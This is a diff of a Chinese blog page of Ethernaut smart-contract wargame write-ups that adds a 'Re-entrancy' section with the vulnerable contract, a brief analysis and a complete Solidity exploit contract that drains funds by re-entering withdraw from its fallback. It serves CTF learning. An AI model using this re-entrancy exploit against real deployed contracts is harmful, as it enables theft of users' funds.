@@ -70,7 +70,7 @@
     <div id="toc" class="toc-article">
         <h3><i class="fas fa-stream"></i> 目录</h3>
         <div class="toc-title"></div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">2.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallback"><span class="toc-number">3.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallout"><span class="toc-number">4.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">5.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telephone"><span class="toc-number">6.</span> <span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token"><span class="toc-number">7.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">8.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">9.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">10.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">11.</span> <span class="toc-text">King</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">2.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallback"><span class="toc-number">3.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallout"><span class="toc-number">4.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">5.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telephone"><span class="toc-number">6.</span> <span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token"><span class="toc-number">7.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">8.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">9.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">10.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">11.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">12.</span> <span class="toc-text">Re-entrancy</span></a></li></ol>
     </div>
     
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="坏孩子のSimple Blogs" type="application/atom+xml">
@@ -234,7 +234,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" style="color: #03a9f4">
+                <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" style="color: #00bcd4">
                     智能合约
                 </a>
             </span>
@@ -846,6 +846,110 @@ contract Attack &#123;
     &#125;
 &#125;
 </code></pre>
+<hr>
+<h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>关卡要求：</p>
+<p>​	这一关的目标是偷走合约的所有资产.</p>
+<p>合约代码：</p>
+<pre><code class="solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;
+
+contract Reentrance &#123;
+    using SafeMath for uint256;
+
+    mapping(address =&gt; uint256) public balances;
+
+    function donate(address _to) public payable &#123;
+        balances[_to] = balances[_to].add(msg.value);
+    &#125;
+
+    function balanceOf(address _who) public view returns (uint256 balance) &#123;
+        return balances[_who];
+    &#125;
+
+    function withdraw(uint256 _amount) public &#123;
+        if (balances[msg.sender] &gt;= _amount) &#123;
+            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);
+            if (result) &#123;
+                _amount;
+            &#125;
+            balances[msg.sender] -= _amount;
+        &#125;
+    &#125;
+
+    receive() external payable &#123;&#125;
+&#125;
+</code></pre>
+<p>合约分析：</p>
+<p>经典的重入攻击</p>
+<p>注意题目使用的 Solidity 版本为 0.6.x, 这个版本不存在溢出检查, 因此 withdraw 方法的 <code>balances[msg.sender] -= _amount</code> 语句存在溢出风险, 这也是能执行重入的前提。</p>
+<p>攻击流程：</p>
+<pre><code class="solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;
+
+contract Reentrance &#123;
+  
+  using SafeMath for uint256;
+  mapping(address =&gt; uint) public balances;
+
+  function donate(address _to) public payable &#123;
+    balances[_to] = balances[_to].add(msg.value);
+  &#125;
+
+  function balanceOf(address _who) public view returns (uint balance) &#123;
+    return balances[_who];
+  &#125;
+
+  function withdraw(uint _amount) public &#123;
+    if(balances[msg.sender] &gt;= _amount) &#123;
+      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);
+      if(result) &#123;
+        _amount;
+      &#125;
+      balances[msg.sender] -= _amount;
+    &#125;
+  &#125;
+
+  receive() external payable &#123;&#125;
+&#125;
+
+contract exploit &#123; 
+  //设定目标合约地址
+  Reentrance reentrance;
+  constructor(address payable instance_add) public payable &#123;
+    reentrance = Reentrance(instance_add);
+  &#125;
+
+  //重写fallback
+  fallback() external payable &#123;
+    if(address(reentrance).balance &gt;= 0 ether)&#123;
+      reentrance.withdraw(0.001 ether);
+    &#125;
+  &#125;
+
+  //攻击，调用withdraw
+  function attack() external &#123;
+    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));
+    reentrance.withdraw(0.001 ether);
+  &#125;
+
+  //查询余额
+  function instance_balance() public view returns (uint) &#123;
+    return address(reentrance).balance;
+  &#125;
+
+   
+&#125;
+</code></pre>
+<p>部署合约时打入一些钱</p>
+<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221953415.png" alt="image-20240822195337510"></p>
+<p>使用函数查询实例合约中原有余额</p>
+<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221957818.png" alt="image-20240822195703407"></p>
+<p>攻击完成后再次查询余额，也可以在控制台查询</p>
+<p><img src="https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202408221956161.png" alt="image-20240822195629790"></p>
 <hr>
 <p>[+] 更新中……</p>
 
